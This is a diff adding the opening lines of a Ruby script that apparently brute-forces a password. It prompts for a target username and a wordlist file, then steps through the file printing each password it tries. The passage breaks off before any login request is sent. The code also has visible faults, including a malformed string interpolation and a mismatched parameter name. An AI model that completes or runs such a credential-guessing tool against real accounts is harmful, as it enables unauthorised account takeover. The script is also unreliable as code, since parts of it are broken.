@@ -1,0 +1,16 @@
+require 'rubygems'
+require 'net/http'
+print "Enter target username:"
+username = gets.chomp
+print "Enter the path the password file:"
+password_file = gets .chomp
+def brute_force(username_, password_file)
+  start_time = Time.now
+  attempts = 0
+  unless File.exist?(password_file)
+puts "Error: Password file '#password_file)' is not found"
+return
+  end
+  File.foreach(password_file).with_index do |password, i|
+password.strip!
+puts "Attempt #{i + 1}: Trying password '#{password}'"
